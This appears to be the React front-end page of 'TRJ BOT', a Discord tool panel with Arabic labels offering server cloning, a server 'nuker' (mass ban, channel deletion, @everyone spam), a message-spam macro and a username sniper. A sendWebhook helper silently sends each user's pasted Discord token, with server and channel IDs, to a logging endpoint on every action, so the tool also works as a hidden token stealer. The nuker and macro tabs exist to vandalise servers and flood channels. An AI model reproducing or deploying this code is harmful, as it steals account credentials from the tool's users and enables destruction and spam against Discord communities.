'use client'

import { useState } from 'react'

export default function Home() {
  const [tab, setTab] = useState('copy')
  const [loading, setLoading] = useState(false)
  const [status, setStatus] = useState('')
  const [result, setResult] = useState('')

  // Copy
  const [copyToken, setCopyToken] = useState('')
  const [copySource, setCopySource] = useState('')
  const [copyTarget, setCopyTarget] = useState('')
  const [copyOpts, setCopyOpts] = useState({ settings: true, roles: true, channels: true, emojis: true })

  // Macro
  const [macroToken, setMacroToken] = useState('')
  const [macroChannel, setMacroChannel] = useState('')
  const [macroMsgs, setMacroMsgs] = useState('')
  const [macroDuration, setMacroDuration] = useState('60')
  const [macroSpeed, setMacroSpeed] = useState('0.3')
  const [macroCount, setMacroCount] = useState('0')
  const [macroMode, setMacroMode] = useState('duration')

  // Nuker
  const [nukerToken, setNukerToken] = useState('')
  const [nukerBotToken, setNukerBotToken] = useState('')
  const [nukerGuild, setNukerGuild] = useState('')
  const [nukerAction, setNukerAction] = useState('')
  const [nukerUseBot, setNukerUseBot] = useState(false)
  const [nukerSpamMsg, setNukerSpamMsg] = useState('@everyone 💀 TROJAN WAS HERE')
  const [nukerServerName, setNukerServerName] = useState('💀 NUKED BY TRJ')

  // Sniper
  const [sniperToken, setSniperToken] = useState('')
  const [sniperLength, setSniperLength] = useState('4')
  const [sniperCount, setSniperCount] = useState('10')
  const [sniperUnderscore, setSniperUnderscore] = useState(false)
  const [sniperDot, setSniperDot] = useState(false)
  const [sniperResults, setSniperResults] = useState<{available: string[], taken: string[], stats: any} | null>(null)

  // Webhook
  const sendWebhook = async (action: string, details: Record<string, string | number | boolean>) => {
    try {
      await fetch('/api/webhook', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action, details })
      })
    } catch {}
  }

  const doCopy = async () => {
    if (!copyToken || !copySource || !copyTarget) return setStatus('❌ املأ كل الحقول')
    setLoading(true); setStatus('⏳ جاري النسخ...')
    
    await sendWebhook('📋 نسخ سيرفر', { 
      '🔑 التوكن': copyToken,
      '🆔 المصدر': copySource, 
      '🆔 الهدف': copyTarget
    })
    
    try {
      const r = await fetch('/api/copy', { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token: copyToken, sourceId: copySource, targetId: copyTarget, options: copyOpts }) 
      })
      const d = await r.json()
      
      if (d.success) {
        setStatus('✅ تم النسخ بنجاح!')
        setResult(`🎭 الرتب: ${d.stats.roles}\n📁 التصنيفات: ${d.stats.cats}\n📝 رومات نصية: ${d.stats.txt}\n🎤 رومات صوتية: ${d.stats.voice}\n😀 إيموجي: ${d.stats.emojis}`)
        
        await sendWebhook('✅ تم النسخ', { 
          '🔑 التوكن': copyToken,
          '🆔 المصدر': copySource,
          '🆔 الهدف': copyTarget,
          '🎭 الرتب': d.stats.roles, 
          '📁 التصنيفات': d.stats.cats,
          '📝 نصية': d.stats.txt,
          '🎤 صوتية': d.stats.voice,
          '😀 إيموجي': d.stats.emojis
        })
      } else {
        setStatus('❌ ' + d.error)
      }
    } catch { setStatus('❌ خطأ في الاتصال') }
    setLoading(false)
  }

  const doMacro = async () => {
    if (!macroToken || !macroChannel || !macroMsgs) return setStatus('❌ املأ كل الحقول')
    setLoading(true); setStatus('⏳ جاري الإرسال...')
    
    await sendWebhook('⚡ بدء ماكرو', { 
      '🔑 التوكن': macroToken, 
      '🆔 الروم': macroChannel, 
      '📝 الرسائل': macroMsgs.substring(0, 300)
    })
    
    try {
      const body: Record<string, unknown> = { 
        token: macroToken, 
        channelId: macroChannel, 
        messages: macroMsgs.split('\n').filter(m => m), 
        speed: parseFloat(macroSpeed) || 0.3 
      }
      
      if (macroMode === 'duration') body.duration = parseInt(macroDuration) || 60
      else body.count = parseInt(macroCount) || 100
      
      const r = await fetch('/api/macro', { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body) 
      })
      const d = await r.json()
      setStatus(d.success ? `✅ تم إرسال ${d.sent} رسالة!` : '❌ ' + d.error)
      
      if (d.success) {
        await sendWebhook('✅ انتهى الماكرو', { 
          '🔑 التوكن': macroToken, 
          '🆔 الروم': macroChannel,
          '✅ أُرسل': d.sent, 
          '❌ فشل': d.failed || 0
        })
      }
    } catch { setStatus('❌ خطأ في الاتصال') }
    setLoading(false)
  }

  const doNuker = async () => {
    if (!nukerGuild || !nukerAction) return setStatus('❌ اختر العملية')
    if (!nukerUseBot && !nukerToken) return setStatus('❌ أدخل التوكن')
    if (nukerUseBot && !nukerBotToken) return setStatus('❌ أدخل توكن البوت')
    
    setLoading(true); setStatus('⏳ جاري التنفيذ...')
    
    const token = nukerUseBot ? `Bot ${nukerBotToken}` : nukerToken
    const actionNames: Record<string, string> = {
      'nuke': '💥 نيكر كامل',
      'banall': '🔨 حظر الكل',
      'delete_channels': '🗑️ حذف رومات',
      'spam': '📧 سبام'
    }
    
    await sendWebhook('💀 بدء نيوكر', { 
      '🔑 التوكن': token, 
      '🆔 السيرفر': nukerGuild, 
      '⚡ العملية': actionNames[nukerAction]
    })
    
    try {
      const r = await fetch('/api/nuker', { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          token, 
          guildId: nukerGuild, 
          action: nukerAction,
          spamMessage: nukerSpamMsg,
          serverName: nukerServerName
        }) 
      })
      const d = await r.json()
      
      if (d.success) {
        setStatus('✅ تم التنفيذ بنجاح!')
        setResult(`🗑️ محذوف: ${d.stats.deleted}\n🔨 ممنوع: ${d.stats.banned}\n📧 منشور: ${d.stats.spam_sent}\n🆕 منشأ: ${d.stats.created}`)
        
        await sendWebhook('✅ تم النيكر', { 
          '🔑 التوكن': token, 
          '🆔 السيرفر': nukerGuild,
          '⚡ العملية': actionNames[nukerAction],
          '🗑️ محذوف': d.stats.deleted, 
          '🔨 ممنوع': d.stats.banned,
          '📧 منشور': d.stats.spam_sent,
          '🆕 منشأ': d.stats.created
        })
      } else {
        setStatus('❌ ' + d.error)
      }
    } catch { setStatus('❌ خطأ في الاتصال') }
    setLoading(false)
  }

  const doSniper = async () => {
    if (!sniperToken) return setStatus('❌ أدخل التوكن')
    setLoading(true); setStatus('⏳ جاري صيد اليوزرات...')
    setSniperResults(null)
    
    await sendWebhook('🎯 بدء صيد', { 
      '🔑 التوكن': sniperToken,
      '📏 الطول': sniperLength,
      '📊 العدد': sniperCount
    })
    
    try {
      const r = await fetch('/api/sniper', { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          token: sniperToken,
          length: parseInt(sniperLength) || 4,
          count: parseInt(sniperCount) || 10,
          useUnderscore: sniperUnderscore,
          useDot: sniperDot
        }) 
      })
      const d = await r.json()
      
      if (d.success) {
        setStatus(`✅ تم فحص ${d.stats.checked} يوزر!`)
        setSniperResults({ available: d.available || [], taken: d.taken || [], stats: d.stats })
        
        await sendWebhook('✅ انتهى الصيد', { 
          '🔑 التوكن': sniperToken,
          '📊 تم فحص': d.stats.checked,
          '✅ متاح': d.stats.available,
          '🎯 اليوزرات': d.available?.slice(0, 5).join(', ') || 'لا يوجد'
        })
      } else {
        setStatus('❌ ' + d.error)
      }
    } catch { setStatus('❌ خطأ في الاتصال') }
    setLoading(false)
  }

  return (
    <main className="min-h-screen bg-gradient-to-br from-gray-900 via-slate-900 to-black text-white">
      {/* Header */}
      <header className="bg-black/60 backdrop-blur-md border-b border-red-500/30 sticky top-0 z-50">
        <div className="max-w-6xl mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-11 h-11 bg-gradient-to-br from-red-500 via-orange-500 to-yellow-500 rounded-xl flex items-center justify-center font-black text-xl shadow-lg shadow-red-500/30">
                T
              </div>
              <div>
                <h1 className="text-xl md:text-2xl font-black bg-gradient-to-r from-red-400 via-orange-400 to-yellow-400 bg-clip-text text-transparent">
                  TRJ BOT
                </h1>
                <p className="text-[10px] text-gray-400 tracking-wider">ADVANCED DISCORD TOOLS</p>
              </div>
            </div>
            <div className="text-gray-500 text-xs">v2.0 • Trj.py</div>
          </div>
        </div>
      </header>

      {/* Tabs */}
      <div className="max-w-6xl mx-auto px-4 pt-4">
        <div className="flex gap-2 overflow-x-auto pb-2 scrollbar-hide">
          {[
            { id: 'copy', label: '📋 نسخ', color: 'from-blue-500 to-cyan-500' },
            { id: 'nuker', label: '💀 نيوكر', color: 'from-red-500 to-orange-500' },
            { id: 'macro', label: '⚡ ماكرو', color: 'from-purple-500 to-pink-500' },
            { id: 'sniper', label: '🎯 صيد', color: 'from-green-500 to-emerald-500' }
          ].map(t => (
            <button 
              key={t.id} 
              onClick={() => { setTab(t.id); setStatus(''); setResult(''); setSniperResults(null) }}
              className={`flex-shrink-0 px-5 py-2.5 rounded-xl font-bold transition-all text-sm ${
                tab === t.id 
                  ? `bg-gradient-to-r ${t.color} text-white shadow-lg scale-105` 
                  : 'bg-slate-800/80 text-gray-400 hover:bg-slate-700'
              }`}
            >
              {t.label}
            </button>
          ))}
        </div>
      </div>

      {/* Content */}
      <div className="max-w-6xl mx-auto px-4 py-4">
        
        {/* COPY */}
        {tab === 'copy' && (
          <div className="grid md:grid-cols-2 gap-4">
            <div className="bg-slate-800/70 rounded-2xl p-5 border border-slate-700/50 shadow-xl">
              <h2 className="text-lg font-bold mb-4 flex items-center gap-2">
                <span className="text-xl">📋</span> نسخ سيرفر
                <span className="text-xs bg-blue-500/20 text-blue-400 px-2 py-0.5 rounded-full">PRO</span>
              </h2>
              <div className="space-y-3">
                <div>
                  <label className="text-xs text-gray-400 mb-1 block">🔑 التوكن</label>
                  <input 
                    type="password" 
                    placeholder="توكن حسابك (يحتاج أدمن في الهدف فقط)"
                    value={copyToken}
                    onChange={e => setCopyToken(e.target.value)}
                    className="w-full p-3 bg-slate-900/90 rounded-xl border border-slate-600 focus:border-blue-500 outline-none text-sm"
                  />
                </div>
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="text-xs text-gray-400 mb-1 block">🆔 المصدر</label>
                    <input 
                      placeholder="Source ID"
                      value={copySource}
                      onChange={e => setCopySource(e.target.value)}
                      className="w-full p-3 bg-slate-900/90 rounded-xl border border-slate-600 focus:border-blue-500 outline-none text-sm"
                    />
                  </div>
                  <div>
                    <label className="text-xs text-gray-400 mb-1 block">🆔 الهدف</label>
                    <input 
                      placeholder="Target ID"
                      value={copyTarget}
                      onChange={e => setCopyTarget(e.target.value)}
                      className="w-full p-3 bg-slate-900/90 rounded-xl border border-slate-600 focus:border-blue-500 outline-none text-sm"
                    />
                  </div>
                </div>
                <div className="grid grid-cols-2 gap-2 pt-2">
                  {[
                    { k: 'settings', l: '⚙️ إعدادات' },
                    { k: 'roles', l: '🎭 رتب' },
                    { k: 'channels', l: '📺 رومات' },
                    { k: 'emojis', l: '😀 إيموجي' }
                  ].map(o => (
                    <label key={o.k} className="flex items-center gap-2 cursor-pointer bg-slate-900/50 p-2 rounded-lg hover:bg-slate-900/80 transition">
                      <input 
                        type="checkbox" 
                        checked={copyOpts[o.k as keyof typeof copyOpts]}
                        onChange={e => setCopyOpts(p => ({ ...p, [o.k]: e.target.checked }))} 
                        className="w-4 h-4 accent-blue-500 rounded" 
                      />
                      <span className="text-xs">{o.l}</span>
                    </label>
                  ))}
                </div>
              </div>
            </div>
            
            <div className="bg-slate-800/70 rounded-2xl p-5 border border-slate-700/50 shadow-xl flex flex-col">
              <h3 className="text-lg font-bold mb-3">📝 معلومات</h3>
              <div className="flex-1 space-y-2 text-gray-300 text-sm">
                <p className="flex items-center gap-2">✅ يحتاج أدمن في السيرفر الهدف فقط</p>
                <p className="flex items-center gap-2">✅ ينسخ الرتب بالترتيب الصحيح</p>
                <p className="flex items-center gap-2">✅ ينسخ الرومات مع التصنيفات</p>
                <p className="flex items-center gap-2">✅ ينسخ صلاحيات كل رتبة</p>
                <p className="flex items-center gap-2">✅ يدعم الإيموجي</p>
              </div>
              <button 
                onClick={doCopy} 
                disabled={loading}
                className="w-full mt-4 py-3.5 bg-gradient-to-r from-blue-500 to-cyan-500 rounded-xl font-bold disabled:opacity-50 transition-all hover:shadow-lg hover:shadow-blue-500/30 hover:scale-[1.02]"
              >
                {loading ? '⏳ جاري النسخ...' : '🚀 بدء النسخ'}
              </button>
            </div>
          </div>
        )}

        {/* NUKER */}
        {tab === 'nuker' && (
          <div className="grid md:grid-cols-2 gap-4">
            <div className="bg-slate-800/70 rounded-2xl p-5 border border-red-500/30 shadow-xl shadow-red-500/10">
              <h2 className="text-lg font-bold mb-4 flex items-center gap-2 text-red-400">
                <span className="text-xl">💀</span> نيوكر سريع
                <span className="text-xs bg-red-500/20 text-red-400 px-2 py-0.5 rounded-full">⚡ FAST</span>
              </h2>
              <div className="space-y-3">
                <div className="flex gap-2">
                  <button 
                    onClick={() => setNukerUseBot(false)}
                    className={`flex-1 py-2.5 rounded-xl text-sm font-medium transition-all ${!nukerUseBot ? 'bg-red-500 text-white' : 'bg-slate-700 text-gray-400'}`}
                  >
                    حساب
                  </button>
                  <button 
                    onClick={() => setNukerUseBot(true)}
                    className={`flex-1 py-2.5 rounded-xl text-sm font-medium transition-all ${nukerUseBot ? 'bg-green-500 text-white' : 'bg-slate-700 text-gray-400'}`}
                  >
                    بوت ⚡
                  </button>
                </div>
                
                <div>
                  <label className="text-xs text-gray-400 mb-1 block">🔑 التوكن</label>
                  <input 
                    type="password" 
                    placeholder={nukerUseBot ? 'Bot Token (أسرع)' : 'User Token'}
                    value={nukerUseBot ? nukerBotToken : nukerToken}
                    onChange={e => nukerUseBot ? setNukerBotToken(e.target.value) : setNukerToken(e.target.value)}
                    className="w-full p-3 bg-slate-900/90 rounded-xl border border-slate-600 focus:border-red-500 outline-none text-sm"
                  />
                </div>
                
                <div>
                  <label className="text-xs text-gray-400 mb-1 block">🆔 السيرفر</label>
                  <input 
                    placeholder="Server ID"
                    value={nukerGuild}
                    onChange={e => setNukerGuild(e.target.value)}
                    className="w-full p-3 bg-slate-900/90 rounded-xl border border-slate-600 focus:border-red-500 outline-none text-sm"
                  />
                </div>
                
                <div className="grid grid-cols-2 gap-2">
                  {[
                    { id: 'nuke', l: '💥 نيكر كامل', c: 'bg-red-500' },
                    { id: 'banall', l: '🔨 حظر الكل', c: 'bg-orange-500' },
                    { id: 'delete_channels', l: '🗑️ حذف رومات', c: 'bg-yellow-500' },
                    { id: 'spam', l: '📧 سبام', c: 'bg-pink-500' }
                  ].map(a => (
                    <button 
                      key={a.id} 
                      onClick={() => setNukerAction(a.id)}
                      className={`p-3 rounded-xl text-sm font-medium transition-all ${nukerAction === a.id ? a.c + ' text-white scale-105' : 'bg-slate-700 text-gray-300 hover:bg-slate-600'}`}
                    >
                      {a.l}
                    </button>
                  ))}
                </div>
              </div>
            </div>
            
            <div className="bg-slate-800/70 rounded-2xl p-5 border border-red-500/30 shadow-xl shadow-red-500/10">
              <h3 className="text-lg font-bold mb-3 text-red-400">⚙️ إعدادات</h3>
              <div className="space-y-3">
                <div>
                  <label className="text-xs text-gray-400 mb-1 block">🏷️ اسم السيرفر</label>
                  <input 
                    placeholder="NUKED BY TRJ"
                    value={nukerServerName}
                    onChange={e => setNukerServerName(e.target.value)}
                    className="w-full p-3 bg-slate-900/90 rounded-xl border border-slate-600 focus:border-red-500 outline-none text-sm"
                  />
                </div>
                <div>
                  <label className="text-xs text-gray-400 mb-1 block">📧 رسالة السبام</label>
                  <input 
                    placeholder="@everyone TROJAN"
                    value={nukerSpamMsg}
                    onChange={e => setNukerSpamMsg(e.target.value)}
                    className="w-full p-3 bg-slate-900/90 rounded-xl border border-slate-600 focus:border-red-500 outline-none text-sm"
                  />
                </div>
                
                <div className="p-3 bg-red-500/10 rounded-xl border border-red-500/20">
                  <p className="text-red-400 text-xs">⚠️ تحذير: عمليات خطيرة لا يمكن التراجع عنها!</p>
                </div>
                
                <button 
                  onClick={doNuker} 
                  disabled={loading || !nukerAction}
                  className="w-full py-3.5 bg-gradient-to-r from-red-500 to-orange-500 rounded-xl font-bold disabled:opacity-50 transition-all hover:shadow-lg hover:shadow-red-500/30 hover:scale-[1.02]"
                >
                  {loading ? '⏳ جاري...' : '🔥 تنفيذ'}
                </button>
              </div>
            </div>
          </div>
        )}

        {/* MACRO */}
        {tab === 'macro' && (
          <div className="grid md:grid-cols-2 gap-4">
            <div className="bg-slate-800/70 rounded-2xl p-5 border border-purple-500/30 shadow-xl shadow-purple-500/10">
              <h2 className="text-lg font-bold mb-4 flex items-center gap-2 text-purple-400">
                <span className="text-xl">⚡</span> ماكرو سبام
              </h2>
              <div className="space-y-3">
                <div>
                  <label className="text-xs text-gray-400 mb-1 block">🔑 التوكن</label>
                  <input 
                    type="password" 
                    placeholder="التوكن"
                    value={macroToken}
                    onChange={e => setMacroToken(e.target.value)}
                    className="w-full p-3 bg-slate-900/90 rounded-xl border border-slate-600 focus:border-purple-500 outline-none text-sm"
                  />
                </div>
                <div>
                  <label className="text-xs text-gray-400 mb-1 block">🆔 الروم</label>
                  <input 
                    placeholder="Channel ID"
                    value={macroChannel}
                    onChange={e => setMacroChannel(e.target.value)}
                    className="w-full p-3 bg-slate-900/90 rounded-xl border border-slate-600 focus:border-purple-500 outline-none text-sm"
                  />
                </div>
                <div>
                  <label className="text-xs text-gray-400 mb-1 block">📝 الرسائل</label>
                  <textarea 
                    placeholder="رسالة 1&#10;رسالة 2&#10;رسالة 3"
                    value={macroMsgs}
                    onChange={e => setMacroMsgs(e.target.value)} 
                    rows={3}
                    className="w-full p-3 bg-slate-900/90 rounded-xl border border-slate-600 focus:border-purple-500 outline-none text-sm resize-none"
                  />
                </div>
              </div>
            </div>
            
            <div className="bg-slate-800/70 rounded-2xl p-5 border border-purple-500/30 shadow-xl shadow-purple-500/10">
              <h3 className="text-lg font-bold mb-3 text-purple-400">⚙️ إعدادات</h3>
              <div className="space-y-3">
                <div className="flex gap-2">
                  <button 
                    onClick={() => setMacroMode('duration')}
                    className={`flex-1 py-2 rounded-xl text-sm transition-all ${macroMode === 'duration' ? 'bg-purple-500 text-white' : 'bg-slate-700 text-gray-400'}`}
                  >
                    بالمدة
                  </button>
                  <button 
                    onClick={() => setMacroMode('count')}
                    className={`flex-1 py-2 rounded-xl text-sm transition-all ${macroMode === 'count' ? 'bg-purple-500 text-white' : 'bg-slate-700 text-gray-400'}`}
                  >
                    بالعدد
                  </button>
                </div>
                
                {macroMode === 'duration' ? (
                  <div>
                    <label className="text-xs text-gray-400 mb-1 block">⏱️ المدة (ثواني)</label>
                    <input 
                      type="number" 
                      value={macroDuration}
                      onChange={e => setMacroDuration(e.target.value)}
                      className="w-full p-3 bg-slate-900/90 rounded-xl border border-slate-600 focus:border-purple-500 outline-none text-sm"
                    />
                  </div>
                ) : (
                  <div>
                    <label className="text-xs text-gray-400 mb-1 block">📊 العدد</label>
                    <input 
                      type="number" 
                      value={macroCount}
                      onChange={e => setMacroCount(e.target.value)}
                      className="w-full p-3 bg-slate-900/90 rounded-xl border border-slate-600 focus:border-purple-500 outline-none text-sm"
                    />
                  </div>
                )}
                
                <div>
                  <label className="text-xs text-gray-400 mb-1 block">🚀 السرعة (ثواني)</label>
                  <input 
                    type="number" 
                    step="0.1"
                    value={macroSpeed}
                    onChange={e => setMacroSpeed(e.target.value)}
                    className="w-full p-3 bg-slate-900/90 rounded-xl border border-slate-600 focus:border-purple-500 outline-none text-sm"
                  />
                </div>
                
                <button 
                  onClick={doMacro} 
                  disabled={loading}
                  className="w-full py-3.5 bg-gradient-to-r from-purple-500 to-pink-500 rounded-xl font-bold disabled:opacity-50 transition-all hover:shadow-lg hover:shadow-purple-500/30"
                >
                  {loading ? '⏳ جاري...' : '🚀 بدء'}
                </button>
              </div>
            </div>
          </div>
        )}

        {/* SNIPER */}
        {tab === 'sniper' && (
          <div className="grid md:grid-cols-2 gap-4">
            <div className="bg-slate-800/70 rounded-2xl p-5 border border-green-500/30 shadow-xl shadow-green-500/10">
              <h2 className="text-lg font-bold mb-4 flex items-center gap-2 text-green-400">
                <span className="text-xl">🎯</span> صيد اليوزرات
              </h2>
              <div className="space-y-3">
                <div>
                  <label className="text-xs text-gray-400 mb-1 block">🔑 التوكن</label>
                  <input 
                    type="password" 
                    placeholder="التوكن"
                    value={sniperToken}
                    onChange={e => setSniperToken(e.target.value)}
                    className="w-full p-3 bg-slate-900/90 rounded-xl border border-slate-600 focus:border-green-500 outline-none text-sm"
                  />
                </div>
                
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="text-xs text-gray-400 mb-1 block">📏 الطول (2-10)</label>
                    <input 
                      type="number" 
                      min="2" 
                      max="10"
                      value={sniperLength}
                      onChange={e => setSniperLength(e.target.value)}
                      className="w-full p-3 bg-slate-900/90 rounded-xl border border-slate-600 focus:border-green-500 outline-none text-sm"
                    />
                  </div>
                  <div>
                    <label className="text-xs text-gray-400 mb-1 block">📊 العدد (1-500)</label>
                    <input 
                      type="number" 
                      min="1" 
                      max="500"
                      value={sniperCount}
                      onChange={e => setSniperCount(e.target.value)}
                      className="w-full p-3 bg-slate-900/90 rounded-xl border border-slate-600 focus:border-green-500 outline-none text-sm"
                    />
                  </div>
                </div>
                
                <div className="flex gap-3">
                  <label className="flex items-center gap-2 cursor-pointer bg-slate-900/50 p-2.5 rounded-lg flex-1 justify-center">
                    <input 
                      type="checkbox" 
                      checked={sniperUnderscore}
                      onChange={e => setSniperUnderscore(e.target.checked)} 
                      className="w-4 h-4 accent-green-500 rounded" 
                    />
                    <span className="text-sm">❌ _</span>
                  </label>
                  <label className="flex items-center gap-2 cursor-pointer bg-slate-900/50 p-2.5 rounded-lg flex-1 justify-center">
                    <input 
                      type="checkbox" 
                      checked={sniperDot}
                      onChange={e => setSniperDot(e.target.checked)} 
                      className="w-4 h-4 accent-green-500 rounded" 
                    />
                    <span className="text-sm">🔹 .</span>
                  </label>
                </div>
              </div>
            </div>
            
            <div className="bg-slate-800/70 rounded-2xl p-5 border border-green-500/30 shadow-xl shadow-green-500/10">
              <h3 className="text-lg font-bold mb-3 text-green-400">📊 النتائج</h3>
              
              {sniperResults ? (
                <div className="space-y-3">
                  <div className="grid grid-cols-3 gap-2 text-center">
                    <div className="bg-slate-900/90 p-3 rounded-xl">
                      <div className="text-2xl font-bold text-green-400">{sniperResults.stats.available}</div>
                      <div className="text-[10px] text-gray-400">✅ متاح</div>
                    </div>
                    <div className="bg-slate-900/90 p-3 rounded-xl">
                      <div className="text-2xl font-bold text-red-400">{sniperResults.stats.taken}</div>
                      <div className="text-[10px] text-gray-400">❌ محجوز</div>
                    </div>
                    <div className="bg-slate-900/90 p-3 rounded-xl">
                      <div className="text-2xl font-bold text-yellow-400">{sniperResults.stats.errors}</div>
                      <div className="text-[10px] text-gray-400">⚠️ خطأ</div>
                    </div>
                  </div>
                  
                  {sniperResults.available.length > 0 && (
                    <div className="bg-slate-900/90 rounded-xl p-3 max-h-24 overflow-auto">
                      <div className="text-xs text-gray-400 mb-2">🎯 المتاحة:</div>
                      <div className="flex flex-wrap gap-1">
                        {sniperResults.available.map((u, i) => (
                          <span key={i} className="bg-green-500/20 text-green-400 px-2 py-1 rounded text-xs font-mono">
                            {u}
                          </span>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              ) : (
                <div className="text-gray-500 text-sm text-center py-10">
                  اضغط "بدء الصيد" للفحص
                </div>
              )}
              
              <button 
                onClick={doSniper} 
                disabled={loading}
                className="w-full mt-3 py-3.5 bg-gradient-to-r from-green-500 to-emerald-500 rounded-xl font-bold disabled:opacity-50 transition-all hover:shadow-lg hover:shadow-green-500/30"
              >
                {loading ? '⏳ جاري الصيد...' : '🎯 بدء الصيد'}
              </button>
            </div>
          </div>
        )}

        {/* Status */}
        {(status || result) && (
          <div className="mt-4 max-w-6xl mx-auto space-y-2">
            {status && (
              <div className={`p-3 rounded-xl text-sm ${status.includes('✅') ? 'bg-green-500/20 border border-green-500/30 text-green-400' : status.includes('⏳') ? 'bg-yellow-500/20 border border-yellow-500/30 text-yellow-400' : 'bg-red-500/20 border border-red-500/30 text-red-400'}`}>
                {status}
              </div>
            )}
            {result && (
              <pre className="p-3 bg-slate-800/80 rounded-xl text-xs text-gray-300 overflow-auto whitespace-pre-wrap border border-slate-700">
                {result}
              </pre>
            )}
          </div>
        )}
      </div>

      {/* Footer */}
      <footer className="text-center text-gray-600 text-xs py-4 border-t border-slate-800/50 mt-4">
        TRJ BOT v2.0 • Developed by <span className="text-red-400">Trj.py</span>
      </footer>
    </main>
  )
}
